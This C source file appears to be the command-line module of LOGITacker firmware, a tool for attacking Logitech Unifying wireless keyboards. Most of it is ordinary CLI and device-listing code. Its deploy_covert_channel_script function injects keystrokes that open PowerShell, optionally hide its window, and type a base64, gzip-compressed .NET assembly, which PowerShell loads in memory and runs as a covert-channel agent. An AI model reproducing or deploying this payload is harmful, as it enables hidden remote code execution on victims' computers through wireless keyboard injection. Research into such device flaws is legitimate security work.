#include "fds.h"
#include "fds_internal_defs.h"
#include "nrf_fstorage.h"
#include "nrf_fstorage_nvmc.h"
#include "ctype.h"
#include "logitacker_tx_payload_provider.h"
#include "logitacker_tx_pay_provider_string_to_keys.h"
#include "logitacker_processor_passive_enum.h"
#include "logitacker_options.h"
#include "logitacker_keyboard_map.h"
#include "nrf_cli.h"
#include "nrf_log.h"
#include "sdk_common.h"
#include "logitacker.h"
#include "logitacker_devices.h"
#include "helper.h"
#include "logitacker_unifying.h"
#include "logitacker_flash.h"
#include "logitacker_processor_inject.h"
#include "logitacker_script_engine.h"
#include "logitacker_processor_covert_channel.h"

//#define CLI_TEST_COMMANDS

static void cmd_devices_remove_all(nrf_cli_t const * p_cli, size_t argc, char **argv);
static void cmd_script_press(nrf_cli_t const *p_cli, size_t argc, char **argv);

#define STORED_DEVICES_AUTOCOMPLETE_LIST_MAX_ENTRIES 60
static char m_stored_device_addr_str_list[STORED_DEVICES_AUTOCOMPLETE_LIST_MAX_ENTRIES][LOGITACKER_DEVICE_ADDR_STR_LEN];
static int m_stored_device_addr_str_list_len = 0;
static char m_device_addr_str_list[LOGITACKER_DEVICES_DEVICE_LIST_MAX_ENTRIES][LOGITACKER_DEVICE_ADDR_STR_LEN];
static int m_device_addr_str_list_len = 0;
static char m_device_addr_str_list_first_entry[] = "all\x00";

#define STORED_SCRIPTS_AUTOCOMPLETE_LIST_MAX_ENTRIES 32
static char m_stored_script_names_str_list[STORED_SCRIPTS_AUTOCOMPLETE_LIST_MAX_ENTRIES][LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN];
static int m_stored_script_names_str_list_len = 0;

void deploy_covert_channel_script(bool hide) {
    char * agentscript = "$b=\"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\";nal no New-Object -F;$m=no IO.MemoryStream;$a=no byte[] 1024;$gz=(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress));$n=0;do{$n=$gz.Read($a,0,$a.Length);$m.Write($a,0,$n)}while ($n -gt 0);[System.Reflection.Assembly]::Load($m.ToArray());[LogitackerClient.Runner]::Run()\n";
    //char * agentscript = "Get-Date\n";
    char chunk[129] = {0};

    logitacker_script_engine_flush_tasks();

    logitacker_script_engine_append_task_press_combo("GUI r");
    logitacker_script_engine_append_task_delay(500);
    logitacker_script_engine_append_task_type_string("powershell.exe\n");
    logitacker_script_engine_append_task_delay(2000);

    if (hide) {
        logitacker_script_engine_append_task_type_string("$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);");
        logitacker_script_engine_append_task_type_string("$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName(\"WindowsBase\")).GetType(\"MS.Win32.UnsafeNativeMethods\"))::SetWindowPos($hw,$i,0,0,100,100,16512)\n");
        logitacker_script_engine_append_task_delay(500);
    }

    while (strlen(agentscript) >= 128) {
        memcpy(chunk, agentscript, 128); //keep last byte 0x00
        logitacker_script_engine_append_task_type_string(chunk);
        agentscript += 128; //advance pointer
    }
    memset(chunk,0,129);
    memcpy(chunk, agentscript, strlen(agentscript)); //keep last byte 0x00
    logitacker_script_engine_append_task_type_string(chunk);
}


static void stored_devices_str_list_update() {
    m_stored_device_addr_str_list_len = 1;
    memcpy(&m_stored_device_addr_str_list[0], m_device_addr_str_list_first_entry, sizeof(m_device_addr_str_list_first_entry));

    fds_find_token_t ftok;
    fds_record_desc_t record_desc;
    fds_flash_record_t flash_record;
    memset(&ftok, 0x00, sizeof(fds_find_token_t));

    while(fds_record_find(LOGITACKER_FLASH_FILE_ID_DEVICES, LOGITACKER_FLASH_RECORD_KEY_DEVICES, &record_desc, &ftok) == FDS_SUCCESS &&
    m_stored_device_addr_str_list_len <= STORED_DEVICES_AUTOCOMPLETE_LIST_MAX_ENTRIES) {
        if (fds_record_open(&record_desc, &flash_record) != FDS_SUCCESS) {
            NRF_LOG_WARNING("Failed to open record");
            continue; // go on with next
        }

        logitacker_devices_unifying_device_t const * p_device = flash_record.p_data;
        helper_addr_to_hex_str(m_stored_device_addr_str_list[m_stored_device_addr_str_list_len], LOGITACKER_DEVICE_ADDR_LEN, p_device->rf_address);
        m_stored_device_addr_str_list_len++;


        if (fds_record_close(&record_desc) != FDS_SUCCESS) {
            NRF_LOG_WARNING("Failed to close record");
        }
    }

}

static void stored_script_names_str_list_update() {
    fds_find_token_t ftoken;
    memset(&ftoken, 0x00, sizeof(fds_find_token_t));
    fds_flash_record_t flash_record;
    fds_record_desc_t fds_record_desc;

    m_stored_script_names_str_list_len = 0;
    while(m_stored_script_names_str_list_len < STORED_SCRIPTS_AUTOCOMPLETE_LIST_MAX_ENTRIES && fds_record_find(LOGITACKER_FLASH_FILE_ID_STORED_SCRIPTS_INFO, LOGITACKER_FLASH_RECORD_KEY_STORED_SCRIPTS_INFO, &fds_record_desc, &ftoken) == FDS_SUCCESS) {
        if (fds_record_open(&fds_record_desc, &flash_record) != FDS_SUCCESS) {
            NRF_LOG_WARNING("failed to open record");
            continue; // go on with next
        }

        stored_script_fds_info_t const * p_stored_tasks_fds_info_tmp = flash_record.p_data;

        int slen = strlen(p_stored_tasks_fds_info_tmp->script_name);
        slen = slen >= LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN ? LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN-1 : slen;
        memcpy(m_stored_script_names_str_list[m_stored_script_names_str_list_len], p_stored_tasks_fds_info_tmp->script_name, slen);

        if (fds_record_close(&fds_record_desc) != FDS_SUCCESS) {
            NRF_LOG_WARNING("failed to close record");
        }

        m_stored_script_names_str_list_len++;
    }
}

static void device_address_str_list_update() {
    m_device_addr_str_list_len = 1;
    memcpy(&m_device_addr_str_list[0], m_device_addr_str_list_first_entry, sizeof(m_device_addr_str_list_first_entry));

    logitacker_devices_list_iterator_t iter = {0};
    logitacker_devices_unifying_device_t * p_device;

    while (logitacker_devices_get_next_device(&p_device, &iter) == NRF_SUCCESS) {
        helper_addr_to_hex_str(m_device_addr_str_list[m_device_addr_str_list_len], LOGITACKER_DEVICE_ADDR_LEN, p_device->rf_address);
        m_device_addr_str_list_len++;
    }

}

// dynamic creation of stored script name list
static void dynamic_script_name(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";

    if (idx == 0) stored_script_names_str_list_update();

    //NRF_LOG_INFO("script list len %d", m_stored_script_names_str_list_len);

    if (idx >= m_stored_script_names_str_list_len) {
        p_static->p_syntax = NULL;
        return;
    }

    p_static->p_syntax = m_stored_script_names_str_list[idx];
}

static void dynamic_device_addr_list_ram_with_all(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";


    if (idx == 0) {
        device_address_str_list_update(); // update list if idx 0 is requested
        p_static->p_syntax = m_device_addr_str_list[0];
        p_static->handler = cmd_devices_remove_all;
        p_static->p_help = "remove all devices";
    } else if (idx < m_device_addr_str_list_len) {
        p_static->p_syntax = m_device_addr_str_list[idx];
    } else {
        p_static->p_syntax = NULL;
    }
}

static void dynamic_device_addr_list_ram_with_usb(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";


    if (idx == 0) {
        device_address_str_list_update(); // update list if idx 0 is requested
        memcpy(m_device_addr_str_list[0], "USB\x00", 4);
        p_static->p_syntax = m_device_addr_str_list[0];
    } else if (idx < m_device_addr_str_list_len) {
        p_static->p_syntax = m_device_addr_str_list[idx];
    } else {
        p_static->p_syntax = NULL;
    }
}

// dynamic creation of command addresses
static void dynamic_device_addr_list_ram(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";

    if (idx == 0) device_address_str_list_update();

    if (idx < m_device_addr_str_list_len-1) {
        p_static->p_syntax = m_device_addr_str_list[idx+1]; //ignore first entry
    } else {
        p_static->p_syntax = NULL;
    }
}
/*
// dynamic creation of command addresses
static void dynamic_device_addr_list_stored_with_all(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";


    if (idx == 0) {
        stored_devices_str_list_update(); // update list if idx 0 is requested
        p_static->p_syntax = m_device_addr_str_list[0];
        p_static->handler = NULL;
        p_static->p_help = "remove all devices";
    } else if (idx < m_stored_device_addr_str_list_len) {
        p_static->p_syntax = m_stored_device_addr_str_list[idx];
    } else {
        p_static->p_syntax = NULL;
    }
}
 */

// dynamic creation of command addresses
static void dynamic_device_addr_list_stored(size_t idx, nrf_cli_static_entry_t *p_static)
{
    // Must be sorted alphabetically to ensure correct CLI completion.
    p_static->handler  = NULL;
    p_static->p_subcmd = NULL;
    p_static->p_help   = "Connect with address.";

    if (idx == 0) stored_devices_str_list_update();

    if (idx < m_stored_device_addr_str_list_len-1) {
        p_static->p_syntax = m_stored_device_addr_str_list[idx+1]; //ignore first entry
    } else {
        p_static->p_syntax = NULL;
    }
}



static void print_logitacker_device_info(nrf_cli_t const * p_cli, const logitacker_devices_unifying_device_t * p_device) {
    if (p_device == NULL) {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "empty device pointer");
        return;
    }
    logitacker_devices_unifying_dongle_t * p_dongle = p_device->p_dongle;
    if (p_dongle == NULL) {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "empty dongle pointer");
        return;
    }

    char tmp_addr_str[16];
    helper_addr_to_hex_str(tmp_addr_str, LOGITACKER_DEVICE_ADDR_LEN, p_device->rf_address);

    // select print color based on device data
    bool dev_is_logitech = p_dongle->classification == DONGLE_CLASSIFICATION_IS_LOGITECH_UNIFYING;
    nrf_cli_vt100_color_t outcol = NRF_CLI_VT100_COLOR_DEFAULT;
    if (dev_is_logitech) outcol = NRF_CLI_VT100_COLOR_BLUE;
    //if (p_device->vuln_forced_pairing) outcol = NRF_CLI_VT100_COLOR_YELLOW;
    if (p_device->vuln_plain_injection) outcol = NRF_CLI_VT100_COLOR_GREEN;
    if (p_device->key_known) outcol = NRF_CLI_VT100_COLOR_RED;

    /*
    nrf_cli_fprintf(p_cli, outcol, "%s %s, keyboard: %s (%s, %s), mouse: %s\r\n",
        nrf_log_push(tmp_addr_str),
        p_dongle->classification == DONGLE_CLASSIFICATION_IS_LOGITECH_UNIFYING ? "Logitech device" : "unknown device",
        (p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD) > 0 ?  "yes" : "no",
        (p_device->caps & LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION) > 0 ?  "encrypted" : "not encrypted",
        p_device->key_known ?  "key ḱnown" : "key unknown",
        (p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_MOUSE) > 0 ?  "yes" : "no"
        );
    */

    nrf_cli_fprintf(p_cli, outcol, "%s", tmp_addr_str);
    nrf_cli_fprintf(p_cli, outcol, " '%s'", strlen(p_device->device_name) == 0 ? "unknown name" : p_device->device_name);

    nrf_cli_fprintf(p_cli, outcol, " keyboard: ");
    if ((p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD) > 0) {
        nrf_cli_fprintf(p_cli, outcol, "%s", (p_device->caps & LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION) > 0 ? "encrypted" : "unencrypted");
    } else {
        nrf_cli_fprintf(p_cli, outcol, "no");
    }

    nrf_cli_fprintf(p_cli, outcol, " mouse: %s", (p_device->report_types & LOGITACKER_DEVICE_REPORT_TYPES_MOUSE) > 0 ? "yes" : "no");
    nrf_cli_fprintf(p_cli, outcol, "\r\n");

    nrf_cli_fprintf(p_cli, outcol, "\tclass: ");
    switch (p_dongle->classification) {
        case DONGLE_CLASSIFICATION_IS_LOGITECH_G700:
            nrf_cli_fprintf(p_cli, outcol, "Logitech G700/G700s");
            break;
        case DONGLE_CLASSIFICATION_IS_LOGITECH_LIGHTSPEED:
            nrf_cli_fprintf(p_cli, outcol, "Logitech LIGHTSPEED");
            break;
        case DONGLE_CLASSIFICATION_UNKNOWN:
            nrf_cli_fprintf(p_cli, outcol, "Unknown");
            break;
        case DONGLE_CLASSIFICATION_IS_NOT_LOGITECH:
            nrf_cli_fprintf(p_cli, outcol, "Not Logitech");
            break;
        case DONGLE_CLASSIFICATION_IS_LOGITECH_UNIFYING:
            nrf_cli_fprintf(p_cli, outcol, "Logitech Unifying compatible");
            break;
    }
    nrf_cli_fprintf(p_cli, outcol, " device WPID: 0x%.2x%.2x", p_device->wpid[0], p_device->wpid[1]);
    nrf_cli_fprintf(p_cli, outcol, " dongle WPID: 0x%.2x%.2x", p_dongle->wpid[0], p_dongle->wpid[1]);
    if (p_dongle->is_nordic) nrf_cli_fprintf(p_cli, outcol, " (Nordic)");
    if (p_dongle->is_texas_instruments) nrf_cli_fprintf(p_cli, outcol, " (Texas Instruments)");
    nrf_cli_fprintf(p_cli, outcol, "\r\n");

    if (p_device->key_known) {
        nrf_cli_fprintf(p_cli, outcol, "\tlink key: ");
        for (int i=0; i<16; i++) nrf_cli_fprintf(p_cli, outcol, "%.02x", p_device->key[i]);
        nrf_cli_fprintf(p_cli, outcol, "\r\n");
    }


}

#ifdef CLI_TEST_COMMANDS

static void cmd_testled(nrf_cli_t const *p_cli, size_t argc, char **argv) {
    if (argc > 1) {
        int count;
        if (sscanf(argv[1], "%d", &count) != 1) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, auto inject count has to be a integer number, but '%s' was given\r\n", argv[1]);
        } else {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "Toggle LED %d\r\n", count);
            switch (count) {
                case 0:
                    bsp_board_led_invert(BSP_BOARD_LED_0);
                    break;
                case 1:
                    bsp_board_led_invert(BSP_BOARD_LED_1);
                    break;
                case 2:
                    bsp_board_led_invert(BSP_BOARD_LED_2);
                    break;
                case 3:
                    bsp_board_led_invert(BSP_BOARD_LED_3);
                    break;
            }
        }
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid argument, testled arg has to be a integer number\r\n");
    }
}



static void cmd_test_a(nrf_cli_t const * p_cli, size_t argc, char **argv)
{

    fds_stat_t fds_stats;
    fds_stat(&fds_stats);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "CLIS STATS\r\n-------------------\r\n");
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "pages available: %d\r\n", fds_stats.pages_available);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "open records   : %d\r\n", fds_stats.open_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "valid records  : %d\r\n", fds_stats.valid_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "dirty records  : %d\r\n", fds_stats.dirty_records);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "words reserved : %d\r\n", fds_stats.words_reserved);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "words used     : %d\r\n", fds_stats.words_used);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "largest contig : %d\r\n", fds_stats.largest_contig);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "freeable words : %d\r\n", fds_stats.freeable_words);
    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "corruption     : %s\r\n", fds_stats.corruption ? "true" : "false");

    //fds_gc();
}


static void cmd_test_b(nrf_cli_t const * p_cli, size_t argc, char **argv) {
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "usb report received  : %d\r\n", g_logitacker_global_runtime_state.usb_led_out_report_count);
        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "usb script triggered: %s\r\n", g_logitacker_global_runtime_state.usb_inject_script_triggered ? "true" : "false");
        deploy_covert_channel_script(true);
}

static void cmd_test_c(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    fds_find_token_t ft;
    memset(&ft, 0x00, sizeof(fds_find_token_t));
    fds_record_desc_t rd;


    fds_flash_record_t flash_record;

    char * tmp_str[256] = {0};

    while (fds_record_iterate(&rd,&ft) == FDS_SUCCESS) {
        uint32_t err;
        err = fds_record_open(&rd, &flash_record);
        if (err != FDS_SUCCESS) {
